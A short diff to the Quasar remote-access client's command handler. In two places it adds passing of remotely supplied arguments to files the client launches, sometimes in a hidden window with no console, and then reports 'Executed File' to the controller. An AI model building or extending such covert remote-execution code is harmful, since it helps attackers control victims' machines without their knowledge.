@@ -53,6 +53,7 @@ namespace Quasar.Client.Commands
                         startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                         startInfo.CreateNoWindow = true;
                     }
+                    startInfo.Arguments = command.Arguments;
                     startInfo.UseShellExecute = false;
                     startInfo.FileName = tempFile;
                     Process.Start(startInfo);
@@ -100,6 +101,7 @@ namespace Quasar.Client.Commands
                     }
                     startInfo.UseShellExecute = false;
                     startInfo.FileName = filePath;
+                    startInfo.Arguments = command.Arguments;
                     Process.Start(startInfo);
 
                     client.Send(new SetStatus {Message = "Executed File"});
